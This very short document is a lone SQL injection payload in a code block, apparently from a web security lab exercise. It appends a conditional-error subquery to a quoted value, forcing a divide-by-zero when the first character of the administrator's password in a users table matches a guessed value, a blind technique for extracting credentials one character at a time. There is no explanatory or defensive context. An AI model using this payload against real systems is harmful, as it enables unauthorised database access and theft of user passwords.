
 ```
 30Q9sw09aHUvhkrv' or ( ( select case when ( SUBSTR( (select password from users where username='administrator'),1,1 )  = 1 ) then 1/0 else 1 end from dual) =1) --
 ```